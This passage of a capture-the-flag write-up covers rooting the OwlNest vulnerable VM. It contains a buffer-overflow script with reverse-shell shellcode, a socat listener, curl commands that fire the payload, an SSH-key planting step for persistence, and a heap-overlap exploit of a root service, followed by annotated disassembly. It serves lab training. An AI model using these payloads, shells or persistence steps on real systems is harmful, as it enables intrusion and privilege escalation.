+      "\x11\x5c\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd"
+      "\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
+      "\x89\xe1\xb0\x0b\xcd\x80" )
+  # ^^^^^^^^^^^^^^^^^^^^^ CHANGE TO YOUR SHELLCODE ^^^^^^^^^^^^^^^^^^^^^
+  ret = pack("<I", 0x080c75ab)        # address of "jmp esp"
+  payload = "\x90"*276 + ret + shellcode
+
+  request = (
+  "-----------------------------1802089588215914701439635166\r\n"
+  "Content-Disposition: form-data; name=\"name\"\r\n"
+  "\r\n"
+  "name\r\n"
+  "-----------------------------1802089588215914701439635166\r\n"
+  "Content-Disposition: form-data; name=\"email\"\r\n"
+  "\r\n"
+  "user@" + payload + "\r\n"
+  "-----------------------------1802089588215914701439635166\r\n"
+  "Content-Disposition: form-data; name=\"description\"\r\n"
+  "\r\n"
+  "description\r\n"
+  "-----------------------------1802089588215914701439635166\r\n"
+  "Content-Disposition: form-data; name=\"uploadfield\"; filename=\"exploit.txt\"\r\n"
+  "Content-Type: text/plain\r\n"
+  "\r\n"
+  "boo"
+  "\r\n"
+  "-----------------------------1802089588215914701439635166\r\n"
+  )
+  print request
+
+Start listener prior to shellcode execution
+"""""""""""""""""""""""""""""""""""""""""""
+
+In another window on the reverse shell target, generate a ssh key for use later, then start up a listener:
+
+.. code-block:: bash
+  :emphasize-lines: 5-8,10
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  ssh-keygen -q -P '' -C hacker -f id_rsa
+  cat id_rsa.pub
+  # results in 
+  # ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCuB0p3QbNmhsDelwSkJo5rvENpdJKwoKdb5EVaVo+VW6RmF6eNlpI36vo2szGByE0syzxusW9HKwQNujqjXzSdhLVcSFKm1sogUV0TwxEfuF9jp+RJrwousntoOmZhheHM/1cAlkkei7nFUxsXGo1BbK1G9WTnc8vifDFm9cEAm9+3+ZiHm1PKoX5OeI2V8BtMaO2iZ1qvnfVlfnUTEA2da0oAIDIMonPOyrBtUmtFdzjUkVLIcyRX/eIeJYA0iMTogGBEqLJjXCxSNvJSLh3cC2ojz0A87dRY2fY1IwnG6Is3xq8f6NslVuXCxlISzNm6ttpG8tdkesHJarh6hKv pentest-meetup@bitbender.org
+
+  socat - TCP-LISTEN:$PORT
+
+Firing off the reverse shell
+""""""""""""""""""""""""""""
+
+After placing the above python code in ``request.py``, kick off the reverse shell:
+
+.. code-block:: bash
+  :emphasize-lines: 5,14-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  # Log in using admin/admin
+  URL='http://owlnest.com/login.php'
+  curl --silent --cookie-jar $COOKIES \
+    --data-urlencode "username=admin" \
+    --data-urlencode "password=admin" \
+    $URL
+  # results in
+  # Successfully Logged in
+
+  # Fire off reverse shell
+  CONTENT_TYPE='Content-Type: multipart/form-data; boundary=---------------------------1802089588215914701439635166'
+  python request.py > request.txt
+  curl --cookie $COOKIES -X POST -H "$CONTENT_TYPE" --data-binary @request.txt \
+      http://owlnest.com/application/upload
+
+At this point the reverse shell should work, so switch to the listener's terminal window. First order of work is to set up the the ssh key generated earlier to allow SSH access:
+
+.. code-block:: bash
+  :emphasize-lines: 3-7
+
+  id
+  cd /home/rmp
+  mkdir .ssh
+  chmod 700 .ssh
+  # User your id_rsa.pub value here
+  echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCuB0p3QbNmhsDelwSkJo5rvENpdJKwoKdb5EVaVo+VW6RmF6eNlpI36vo2szGByE0syzxusW9HKwQNujqjXzSdhLVcSFKm1sogUV0TwxEfuF9jp+RJrwousntoOmZhheHM/1cAlkkei7nFUxsXGo1BbK1G9WTnc8vifDFm9cEAm9+3+ZiHm1PKoX5OeI2V8BtMaO2iZ1qvnfVlfnUTEA2da0oAIDIMonPOyrBtUmtFdzjUkVLIcyRX/eIeJYA0iMTogGBEqLJjXCxSNvJSLh3cC2ojz0A87dRY2fY1IwnG6Is3xq8f6NslVuXCxlISzNm6ttpG8tdkesHJarh6hKv pentest-meetup@bitbender.org' > .ssh/authorized_keys
+  chmod 600 .ssh/authorized_keys
+  exit
+
+Now we are set to SSH as rmp to owlnest.com.
+
+Exploit port 31337
+------------------
+
+Download :file:`adminconsole`
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Now SSH to owlnest as rmp. We immediately find :file:`adminconsole`, the program running on port 31337. :file:`/etc/xinetd.d/adminconsole` shows it's started as root so we download it to Kali for further analysis.
+
+.. code-block:: bash
+  :emphasize-lines: 5,8-20,25,34,40-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  ssh -i id_rsa rmp@owlnest.com
+  rmp@owlnest:~$ ls
+  adminconsole  chargen  daytime  discard  echo  time
+  rmp@owlnest:~$ ./adminconsole
+          (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
+          /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
+          \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
+         /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
+         \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
+     -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
+          \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
+
+  This is the OwlNest Administration console
+
+  Type Help for a list of available commands.
+  # cntl-D to exit adminconsole
+  rmp@owlnest:~$ ps -ef | grep xinetd
+  root      2595     1  0 Aug23 ?        00:00:00 /usr/sbin/xinetd -pidfile /var/run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6
+  rmp       3293  3054  0 02:30 pts/0    00:00:00 grep xinetd
+
+  rmp@owlnest:~$ cat /etc/xinetd.d/adminconsole
+  # default: on
+
+  service adminconsole
+  {
+    port = 31337
+    type = UNLISTED
+    socket_type = stream
+    wait = no
+    user = root
+    server = /home/rmp/adminconsole
+    log_on_success += USERID PID HOST EXIT DURATION
+    log_on_failure += USERID HOST ATTEMPT
+    disable = no
+  }
+  rmp@owlnest:~$ # scp the file to KALI - change below to your userid@ip
+  rmp@owlnest:~$ scp adminconsole hacker@192.168.1.28:pentest/owlnest/exploit/
+  rmp@owlnest:~$ rm ~/.ssh/known_hosts 
+
+Analyze :file:`adminconsole`
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Analyze the binary :file:`adminconsole` just like :file:`upload`:
+
+.. code-block:: bash
+  :emphasize-lines: 5-15,17-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  P=adminconsole
+  objdump -s --section .comment $P    # compiler?
+  ldd $P    # statically linked
+  readelf --segments $P    # ELF segments
+  readelf --sections $P    # ELF sections (contained in segments)
+  ./checksec --file $P
+  # results in
+  # No RELRO, No canary found, NX disabled, No PIE, No RPATH, No RUNPATH, FORTIFY Yes
+  ./checksec --fortify-file $P
+  # results in
+  # 4/51 FORTIFIED syslog_chk, vfprintf_chk, vfprintf_chk, vsyslog_chk
+
+  # Get a smallish list of 19 symbols for analysis
+  nm -g $P | grep -v ' _' | grep ' T ' | cut -d" " -f3 \
+      | sort | tee ${P}_symbols.txt
+  # show libc version on Kali
+  ldd --version
+  # results in 2.19
+  # Get symbols in 32 bit libc
+  nm -D /lib32/libc-2.19.so | grep -v ' _' | grep ' T ' | cut -d" " -f3 \
+      | sort | tee ${P}_libc.txt
+  # List symbols only in $P
+  comm -23 ${P}_symbols.txt ${P}_libc.txt | tee ${P}_uniq.txt
+  # results in 19 routines
+
+Of the 19 routines left, all but 4 are library routines: loadPasswordFromFile, main, printBanner, printHelp. We'll concentrate on loadPasswordFromFile and main, assuming that the simple printBanner and printHelp are too easy to mess up.
+
+Disassemble :file:`adminconsole`
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+To disassemble :file:`adminconsole`:
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  for s in loadPasswordFromFile main printBanner printHelp ; do
+    gdb -batch -ex 'file adminconsole' -ex "disassemble $s"
+  done
+
+Before we delve into the disassembled code, here's a few tips to aid code reading. 
+The code make reference to hex addresses like "0x80abad4"; you can view the contents via either ``gdb -batch -ex 'file adminconsole' -ex 'x/s 0x80abad4'`` for a string, or substitute "x/x" for "x/s" to look at a hex dump.
+
+.. code-block:: bash
+  :emphasize-lines: 2,4,6,8
+
+  gdb -batch -ex 'file adminconsole' -ex 'x/s 0x80abad4'
+  # 0x80abad4:  "\r\n"
+  gdb -batch -ex 'file adminconsole' -ex 'x/s 0x80abbb8'
+  # 0x80abad4:  "rb"
+  gdb -batch -ex 'file adminconsole' -ex 'x/s 0x80abbbb'
+  # "/root/password.txt"
+  gdb -batch -ex 'file adminconsole' -ex 'x/x 0x80ca4c4'
+  # 0x80ca4c4 <stderr>:  0x080ca1e0
+
+There are also some bss section globals used in the program:
+
+.. code-block:: console
+  :emphasize-lines: 1,4-
+
+  nm adminconsole | grep ' B ' | grep -v ' _' | sort
+  # results in
+  # 00000010 B errno
+  # 080cc2a0 B password
+  # 080cc2c0 B auth
+  # 080cc2e0 B yourpassword
+  # 080cc300 B pwd
+  # 080cc304 B privileges
+
+The globals password, auth, yourpassword, pwd, and privileges are in the .bss segment but their acutal data is allocated on the heap. For the curious, consult the following for descriptions of .data, .bss, and the heap:
+
+* `Data segment <https://en.wikipedia.org/wiki/Data_segment>`_
+
+* `Memory Layout of C Programs <http://www.geeksforgeeks.org/memory-layout-of-c-program/>`_
+
+* `Memory Layout of C Program - Code, Data, .BSS, Stack, and Heap Segments <http://cs-fundamentals.com/c-programming/memory-layout-of-c-program-code-data-segments.php>`_
+
+Understanding :file:`adminconsole`
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Knowing what and where these globals are stored is key to understanding the exploit. :file:`adminconsole` provides 5 commands:
+
+#. help
+
+   Lists the 5 commands: help, username, password, privs, login.
+
+#. username
+
+   The actual username specified is ignored. What this is supposed to do is allocate space for filename string "/root/password.txt" and point global auth to that space. What it does instead is allocate space for 4 bytes, initializes them to 0, then proceeds to store string "/root/password.txt" 32 bytes after the 4 allocated bytes. The filename pointed to by global auth is supposed to exist on the owlnest.com server and contain the password you must enter (terminated by "\\r\\n").
+
+   So two bad things can happen here. If the space 32 bytes after has already been allocated, then string "/root/password.txt" clobbers that space. If the space hasn't already been allocated, then that data will clobber string "/root/password.txt".
+
+   The exploit hinges on running "username foo" first, then running another command to clobber "/root/password.txt" with another filename (say "/tmp/password.txt" or "/home/rmp/password.txt") so that we can override the required password.
+
+#. password
+
+   Passwords longer than 30 characters are ignored. Also, if global auth has not been initialized via command username the password is ignored. Otherwise, global yourpassword is set to the provided password. Function loadPasswordFromFile is called to read in the password from the file pointed to by global auth, with the returned password stored first into global pwd, then into global password. A login command will only succeed if global yourpassword = global password. Note that this calls routines that may allocate data on the stack.
+
+#. privs
+
+   Command privs stores an arbitrarily long string in global privs (using storage from the heap). The actual value is ignored by adminconsole. This is a prime candidate to overwrite global auth data. There's are some caveats: we're hoping heap memory is allocated sequentially so that the next memory allocation will start between auth and auth+32; we're hoping nothing else is filling up the heap after command username but before command privs; and we're potentially going to need a filler at the start of the privs string to position the substitute filename on top of "/root/password.txt".
+
+#. login
+
+   Command login first prints an error message if the username and password commands have not been run. Next it checks if global yourpassword (the one entered via the password command) and global password (the one read from "/root/password.txt") are the same. If they are the same, the adminconsole drops into a bash shell (``system("/bin/sh")``). Given that adminconsole runs as root, it's game over.
+
+The exploit
+^^^^^^^^^^^
+
+So here's the outline of the exploit. Set up a password file on owlnest:
+
+.. code-block:: bash
+  :emphasize-lines: 5
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  ssh -i id_rsa rmp@owlnest.com
+  # adminconsole expects "\r\n" terminator in the password file
+  printf "password\r\n" > /tmp/password.txt
+  exit
+
+Linux memory is allocated in chunks of not less that 16 bytes in a 32-bit system, 24 bytes for 64-bit system (see `A Memory Allocator <http://gee.cs.oswego.edu/dl/html/malloc.html>`_). So auth+32 is around 1 or 2 chunks after auth. Memory is hopefully allocated sequentially, so memory allocation for command privs should follow that of command username (which allocated global auth). If memory allocation for privs is the next chunk, you'll need 16 bytes filler to get to auth+32. So we'll try that in our first run of adminconsole:
+
+.. code-block:: bash
+  :emphasize-lines: 5-8,12,14,19,22-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  socat - TCP-LISTEN:owlnest.com:31337
+  username this_is_ignored
+  privs 1234567890123456/tmp/password.txt
+  login
+  # results in
+  # Access Granted!
+  # Dropping into /bin/sh
+  id
+  # results in
+  # uid=0(root) gid=0(root) groups=0(root)
+  ls /root
+  # results in
+  # flag.txt
+  # password.txt
+  cat /root/password.txt
+  # results in
+  # _th1s1s45up3r53cr3tPassW0rd!
+  cat /root/flag.txt
+  # results in
+  #                \ `-._......_.-` /
+  #                 `.  '.    .'  .'  	Oh Well, in the end you did it!
+  #                  //  _`\/`_  \\    	You stopped the olws' evil plan  
+  #                 ||  /\O||O/\  ||   	By pwning their secret base you
+  #                 |\  \_/||\_/  /|   	saved the world!
+  #                 \ '.   \/   .' /	
+  #                 / ^ `'~  ~'`   \ 
+  #                /  _-^_~ -^_ ~-  |
+  #                | / ^_ -^_- ~_^\ |
+  #                | |~_ ^- _-^_ -| |
+  #                | \  ^-~_ ~-_^ / |
+  #                \_/;-.,____,.-;\_/
+  #         ==========(_(_(==)_)_)=========
+  #
+  # The flag is: ea2e548590260e12030c2460f82c1cff8965cff1971107a9ecb3565b08c274f4
+  #
+  # Hope you enjoyed this vulnerable VM.
+  # Looking forward to see a writeup from you soon!
+  # don't forget to ping me on twitter with your thoughts
+  #
+  # Sincerely
+  # @Swappage
+  #
+  #
+  # PS: why the owls? oh well, I really don't know and yes: i really suck at fictioning :p
+  # True story is that i was looking for some ASCII art to place in the puzzles and owls popped out first
+
+And we're lucky to be done. Based on differences in memory allocation we may have to had different fillers tried, but we got the next chunk and 16 bytes filler worked.
+
+Detailed code analysis
+^^^^^^^^^^^^^^^^^^^^^^
+
+Dump of assembler code for function loadPasswordFromFile:
+
+.. code-block:: objdump
+
+   0x080484be <+0>:    push   ebp
+   0x080484bf <+1>:    mov    ebp,esp
+   0x080484c1 <+3>:    sub    esp,0x28                             # stack size 40b
+   0x080484c4 <+6>:    mov    DWORD PTR [esp+0x4],0x80abad4        # stack(4) = addr "\r\n"
+   0x080484cc <+14>:   mov    eax,DWORD PTR [ebp+0x8]              # stack(0) = ARG1
+   0x080484cf <+17>:   mov    DWORD PTR [esp],eax                  #
+   0x080484d2 <+20>:   call   0x8057950 <strtok>                   # strtok(ARG1, "\r\n")
+   0x080484d7 <+25>:   mov    DWORD PTR [ebp-0x10],eax             # stack(24)=strtok()
+   0x080484da <+28>:   mov    DWORD PTR [esp+0x4],0x80abbb8        # stack(4) = addr "rb"
+   0x080484e2 <+36>:   mov    eax,DWORD PTR [ebp-0x10]             # stack(0) = strtok()
+   0x080484e5 <+39>:   mov    DWORD PTR [esp],eax                  #
+   0x080484e8 <+42>:   call   0x8049f10 <fopen>                    # fopen(strtok(),"rb")
+   0x080484ed <+47>:   mov    DWORD PTR [ebp-0xc],eax              # stack(28)=fopen()
+   0x080484f0 <+50>:   cmp    DWORD PTR [ebp-0xc],0x0              # open worked?
+   0x080484f4 <+54>:   jne    0x804850d <loadPasswordFromFile+79>  # yes = skip read "/root/password.txt"
+   0x080484f6 <+56>:   mov    DWORD PTR [esp+0x4],0x80abbb8        # stack(4) = "rb"
+   0x080484fe <+64>:   mov    DWORD PTR [esp],0x80abbbb            # stack(0) = "/root/password.txt"
+   0x08048505 <+71>:   call   0x8049f10 <fopen>                    # no = read "/root/password.txt"
+   0x0804850a <+76>:   mov    DWORD PTR [ebp-0xc],eax              # stack(28)=fopen()
+   0x0804850d <+79>:   mov    DWORD PTR [esp+0x8],0x2              # stack(8) = 2
+   0x08048515 <+87>:   mov    DWORD PTR [esp+0x4],0x0              # stack(4) = 0
+   0x0804851d <+95>:   mov    eax,DWORD PTR [ebp-0xc]              # stack(0) = fopen()
+   0x08048520 <+98>:   mov    DWORD PTR [esp],eax                  #
+   0x08048523 <+101>:  call   0x804a720 <fseek>                    # fseek(fopen(),0,2)
+   0x08048528 <+106>:  mov    eax,DWORD PTR [ebp-0xc]              # stack(0) = fopen()
+   0x0804852b <+109>:  mov    DWORD PTR [esp],eax                  #
+   0x0804852e <+112>:  call   0x804a070 <ftell>                    # ftell(fopen())
+   0x08048533 <+117>:  mov    DWORD PTR [ebp-0x14],eax             # stack(20) = ftell()
+   0x08048536 <+120>:  mov    DWORD PTR [esp+0x8],0x0              # stack(8) = 0
+   0x0804853e <+128>:  mov    DWORD PTR [esp+0x4],0x0              # stack(4) = 0
+   0x08048546 <+136>:  mov    eax,DWORD PTR [ebp-0xc]              # stack(0) = fopen()
+   0x08048549 <+139>:  mov    DWORD PTR [esp],eax                  #
+   0x0804854c <+142>:  call   0x804a720 <fseek>                    # fseek(fopen(),0,0)
+   0x08048551 <+147>:  mov    eax,DWORD PTR [ebp-0x14]             # stack(0) = ftell()+1
+   0x08048554 <+150>:  add    eax,0x1                              #
+   0x08048557 <+153>:  mov    DWORD PTR [esp],eax                  #
+   0x0804855a <+156>:  call   0x8055550 <malloc>                   # malloc(ftell()+1)
+   0x0804855f <+161>:  mov    DWORD PTR [ebp-0x18],eax             # stack(16) = malloc()
+   0x08048562 <+164>:  cmp    DWORD PTR [ebp-0x18],0x0             # worked?
+   0x08048566 <+168>:  jne    0x8048590 <loadPasswordFromFile+210> # jump if worked
+   0x08048568 <+170>:  mov    eax,ds:0x80ca4c4                     # failed so err msg
+   0x0804856d <+175>:  mov    DWORD PTR [esp+0xc],eax              # stack(12) = STDERR
+   0x08048571 <+179>:  mov    DWORD PTR [esp+0x8],0x1b             # stack(8) = 27
+   0x08048579 <+187>:  mov    DWORD PTR [esp+0x4],0x1              # stack(4) = 1
+   0x08048581 <+195>:  mov    DWORD PTR [esp],0x80abbce            # stack(0) = "Unable to allocate buffer\r\n"
+   0x08048588 <+202>:  call   0x804a220 <fwrite>                   # fwrite(error message)
+   0x0804858d <+207>:  nop                                         #
+   0x0804858e <+208>:  jmp    0x80485bf <loadPasswordFromFile+257> # return from routine
+   0x08048590 <+210>:  mov    eax,DWORD PTR [ebp-0xc]              # stack(12) = fopen()
+   0x08048593 <+213>:  mov    DWORD PTR [esp+0xc],eax              #
+   0x08048597 <+217>:  mov    eax,DWORD PTR [ebp-0x14]             # stack(8) = ftell()
+   0x0804859a <+220>:  mov    DWORD PTR [esp+0x8],eax              #
+   0x0804859e <+224>:  mov    DWORD PTR [esp+0x4],0x1              # stack(4) = 1
+   0x080485a6 <+232>:  mov    eax,DWORD PTR [ebp-0x18]             # stack(0) = malloc()
+   0x080485a9 <+235>:  mov    DWORD PTR [esp],eax                  #
+   0x080485ac <+238>:  call   0x8049f40 <fread>                    # fread(malloc(), ftell(), fopen())
+   0x080485b1 <+243>:  mov    eax,DWORD PTR [ebp-0xc]              # stack(0) = fopen()
+   0x080485b4 <+246>:  mov    DWORD PTR [esp],eax                  #
+   0x080485b7 <+249>:  call   0x8049980 <fclose>                   # fclose(fopen())
+   0x080485bc <+254>:  mov    eax,DWORD PTR [ebp-0x18]             # RETURN malloc()
+   0x080485bf <+257>:  leave  
+   0x080485c0 <+258>:  ret    
+
+This corresponds to the following pseudocode that tries to read passwords from the input filename string, but reads from :file:`/root/password.txt` if it can't.
+
+.. code-block:: c
+
+  ptr loadPasswordFromFile(str* fileName) {
+    // Get filename from argument
+    filename = strtok(ARG1, "\r\n")
+    file = fopen(filename,"rb")
+    if (file = 0) {
+      file = fopen("/root/password.txt", "rb")
+    }
+    fseek(file,0,2)
+    size = ftell(file)
+    fseek(file,0,0)
+    buffer = malloc(size+1)
+    if (buffer = 0) {
+      fwrite("Unable to allocate buffer\r\n")
+      return 0
+    } else {
+      fread(buffer, size, file)
+      return buffer
+    }
+  }
+
+Dump of assembler code for function main:
+
+.. code-block:: objdump
+
+   0x080485c1 <+0>:    push   ebp
+   0x080485c2 <+1>:    mov    ebp,esp
+   0x080485c4 <+3>:    and    esp,0xfffffff0
+   0x080485c7 <+6>:    sub    esp,0xa0                          # stack size 160b
+   0x080485cd <+12>:   call   0x8048254 <printBanner>           # printBanner
+   0x080485d2 <+17>:   jmp    0x80485d5 <main+20>
+   0x080485d4 <+19>:   nop
+   0x080485d5 <+20>:   mov    DWORD PTR [esp],0x80abbea         # "Ready:"
+   0x080485dc <+27>:   call   0x8049950 <printf>                # print "Ready:"
+   0x080485e1 <+32>:   mov    eax,ds:0x80ca4c0                  # arg1=STDOUT
+   0x080485e6 <+37>:   mov    DWORD PTR [esp],eax
+   0x080485e9 <+40>:   call   0x8049b70 <fflush>                # flush(STDOUT)
+   0x080485ee <+45>:   mov    eax,ds:0x80ca4bc                  # STDIN
+   0x080485f3 <+50>:   mov    DWORD PTR [esp+0x8],eax           # arg3=STDIN
+   0x080485f7 <+54>:   mov    DWORD PTR [esp+0x4],0x80          # arg2=128
+   0x080485ff <+62>:   lea    eax,[esp+0x18]                    # stack(24) is input
+   0x08048603 <+66>:   mov    DWORD PTR [esp],eax               # arg1=input
+   0x08048606 <+69>:   call   0x8049c70 <fgets>                 # fgets(input,128b,STDIN)
+   0x0804860b <+74>:   test   eax,eax                           #
+   0x0804860d <+76>:   je     0x8048897 <main+726>              # exit on 0x0
+   0x08048613 <+82>:   mov    DWORD PTR [esp+0x8],0x4           # *help* arg3=4
+   0x0804861b <+90>:   mov    DWORD PTR [esp+0x4],0x80abbf2     # arg2="help"
+   0x08048623 <+98>:   lea    eax,[esp+0x18]                    # arg1=input
+   0x08048627 <+102>:  mov    DWORD PTR [esp],eax
+   0x0804862a <+105>:  call   0x8056d80 <strncmp>               # strncmp(input,"help",4)
+   0x0804862f <+110>:  test   eax,eax                           # user input = "help"?
+   0x08048631 <+112>:  jne    0x8048638 <main+119>              # no, skip to *privs *
+   0x08048633 <+114>:  call   0x80483ae <printHelp>             # yes, call printHelp
+   0x08048638 <+119>:  mov    DWORD PTR [esp+0x8],0x6           # *privs * arg3=6
+   0x08048640 <+127>:  mov    DWORD PTR [esp+0x4],0x80abbf7     # arg2="privs "
+   0x08048648 <+135>:  lea    eax,[esp+0x18]                    # arg1=input
+   0x0804864c <+139>:  mov    DWORD PTR [esp],eax
+   0x0804864f <+142>:  call   0x8056d80 <strncmp>               # strncmp(input,"privs ",6)
+   0x08048654 <+147>:  test   eax,eax                           # input="privs "?
+   0x08048656 <+149>:  jne    0x804866c <main+171>              # no, skip to *password * check
+   0x08048658 <+151>:  lea    eax,[esp+0x18]                    # yes, get input after privs
+   0x0804865c <+155>:  add    eax,0x6                           # skip first 6 input bytes
+   0x0804865f <+158>:  mov    DWORD PTR [esp],eax               # arg1 = user input w/o 6 bytes
+   0x08048662 <+161>:  call   0x8056c80 <strdup>                # strdup(input[6:])
+   0x08048667 <+166>:  mov    ds:0x80cc304,eax                  # <privileges> = strdup()
+   0x0804866c <+171>:  mov    DWORD PTR [esp+0x8],0x9           # *password * arg3=9
+   0x08048674 <+179>:  mov    DWORD PTR [esp+0x4],0x80abbfe     # arg2="password "
+   0x0804867c <+187>:  lea    eax,[esp+0x18]                    # arg1=input
+   0x08048680 <+191>:  mov    DWORD PTR [esp],eax
+   0x08048683 <+194>:  call   0x8056d80 <strncmp>               # strncmp(input,"password ",9)
+   0x08048688 <+199>:  test   eax,eax                           # input="password "?
+   0x0804868a <+201>:  jne    0x80486fa <main+313>              # no, skip to *username * check
+   0x0804868c <+203>:  lea    eax,[esp+0x18]                    # yes, skip first 9 bytes user input
+   0x08048690 <+207>:  add    eax,0x9
+   0x08048693 <+210>:  mov    DWORD PTR [esp],eax
+   0x08048696 <+213>:  call   0x8056cd0 <strlen>                # strlen(input w/o 9 bytes)
+   0x0804869b <+218>:  cmp    eax,0x1e                          # strlen() > 30?
+   0x0804869e <+221>:  ja     0x80486fa <main+313>              # yes, skip to "username " check
+   0x080486a0 <+223>:  mov    eax,ds:0x80cc2c0                  # <auth> = 0?
+   0x080486a5 <+228>:  test   eax,eax                           #
+   0x080486a7 <+230>:  je     0x80486fa <main+313>              # yes, skip to *username *
+   0x080486a9 <+232>:  mov    DWORD PTR [esp+0x8],0x1f          # arg3=31
+   0x080486b1 <+240>:  lea    eax,[esp+0x18]                    # arg2=input[9:]
+   0x080486b5 <+244>:  add    eax,0x9
+   0x080486b8 <+247>:  mov    DWORD PTR [esp+0x4],eax
+   0x080486bc <+251>:  mov    DWORD PTR [esp],0x80cc2e0         # arg1=<yourpassword>:
+   0x080486c3 <+258>:  call   0x8056e30 <strncpy>               # strncpy(<yourpassword>,input[9:],31)
+   0x080486c8 <+263>:  mov    eax,ds:0x80cc2c0                  # arg1=<auth>[32:]
+   0x080486cd <+268>:  add    eax,0x20
+   0x080486d0 <+271>:  mov    DWORD PTR [esp],eax
+   0x080486d3 <+274>:  call   0x80484be <loadPasswordFromFile>  # call loadPasswordFromFile
+   0x080486d8 <+279>:  mov    ds:0x80cc300,eax                  # <pwd>=read in password
+   0x080486dd <+284>:  mov    eax,ds:0x80cc300                  #
+   0x080486e2 <+289>:  mov    DWORD PTR [esp+0x8],0x1f          # arg3=31
+   0x080486ea <+297>:  mov    DWORD PTR [esp+0x4],eax           # arg2=<pwd>
+   0x080486ee <+301>:  mov    DWORD PTR [esp],0x80cc2a0         # arg1=<password>
+   0x080486f5 <+308>:  call   0x8056e30 <strncpy>               # strncpy(<password>,<pwd>,31)
+   0x080486fa <+313>:  mov    DWORD PTR [esp+0x8],0x9           # *username *, arg3=9
+   0x08048702 <+321>:  mov    DWORD PTR [esp+0x4],0x80abc08     # arg2="username "
+   0x0804870a <+329>:  lea    eax,[esp+0x18]                    # arg1=input
+   0x0804870e <+333>:  mov    DWORD PTR [esp],eax
+   0x08048711 <+336>:  call   0x8056d80 <strncmp>               # strncmp(input,"username ",9)
+   0x08048716 <+341>:  test   eax,eax                           # input="username"?
+   0x08048718 <+343>:  jne    0x8048768 <main+423>              # no, skip to *login* check
+   0x0804871a <+345>:  mov    DWORD PTR [esp],0x4
+   0x08048721 <+352>:  call   0x8055550 <malloc>                # malloc(4)
+   0x08048726 <+357>:  mov    ds:0x80cc2c0,eax                  # <auth>=malloc(4)
+   0x0804872b <+362>:  mov    eax,ds:0x80cc2c0                  # 
+   0x08048730 <+367>:  mov    DWORD PTR [esp+0x8],0x4           # arg3=4
+   0x08048738 <+375>:  mov    DWORD PTR [esp+0x4],0x0           # arg2=0
+   0x08048740 <+383>:  mov    DWORD PTR [esp],eax               # arg1=<auth>
+   0x08048743 <+386>:  call   0x8057cc0 <memset>                # memset(<auth>,0,4)
+   0x08048748 <+391>:  mov    eax,ds:0x80cc2c0                  # <auth>
+   0x0804874d <+396>:  add    eax,0x20                          # <auth>+32
+   0x08048750 <+399>:  mov    DWORD PTR [esp+0x8],0x1f          # arg3=31
+   0x08048758 <+407>:  mov    DWORD PTR [esp+0x4],0x80abc12     # arg2="/root/password.txt"
+   0x08048760 <+415>:  mov    DWORD PTR [esp],eax               # arg1=<auth>+32
+   0x08048763 <+418>:  call   0x8056e30 <strncpy>               # <auth>+32="/root/password.txt"
+   0x08048768 <+423>:  mov    DWORD PTR [esp+0x8],0x4           # *login*, arg3=4
+   0x08048770 <+431>:  mov    DWORD PTR [esp+0x4],0x80abc26     # arg2="login"
+   0x08048778 <+439>:  lea    eax,[esp+0x18]                    # arg1=input
+   0x0804877c <+443>:  mov    DWORD PTR [esp],eax
+   0x0804877f <+446>:  call   0x8056d80 <strncmp>               # strncmp(input,"login",4)
+   0x08048784 <+451>:  test   eax,eax                           # user input = "logi"?
+   0x08048786 <+453>:  jne    0x80485d4 <main+19>               # no, back to top of main
+   0x0804878c <+459>:  mov    eax,0x80cc2e0                     # <yourpassword>
+   0x08048791 <+464>:  movzx  eax,BYTE PTR [eax]                # 
+   0x08048794 <+467>:  test   al,al                             # <yourpassword> empty?
+   0x08048796 <+469>:  je     0x80487a4 <main+483>              # not set, jump to err msg
+   0x08048798 <+471>:  mov    eax,0x80cc2a0                     # <password>
+   0x0804879d <+476>:  movzx  eax,BYTE PTR [eax]
+   0x080487a0 <+479>:  test   al,al                             # <password> empty?
+   0x080487a2 <+481>:  jne    0x80487ce <main+525>              # if set, jump to pwd check
+   0x080487a4 <+483>:  mov    eax,ds:0x80ca4c0                  # STDOUT
+   0x080487a9 <+488>:  mov    DWORD PTR [esp+0xc],eax
+   0x080487ad <+492>:  mov    DWORD PTR [esp+0x8],0x1e
+   0x080487b5 <+500>:  mov    DWORD PTR [esp+0x4],0x1
+   0x080487bd <+508>:  mov    DWORD PTR [esp],0x80abc2c         # "Username or Password not set\r\n"
+   0x080487c4 <+515>:  call   0x804a220 <fwrite>                # fwrite()
+   0x080487c9 <+520>:  jmp    0x80485d4 <main+19>               # loop to top of main
+   0x080487ce <+525>:  mov    DWORD PTR [esp+0x4],0x80abad4     # arg2="\r\n"
+   0x080487d6 <+533>:  mov    DWORD PTR [esp],0x80cc2a0         # arg1=<password>
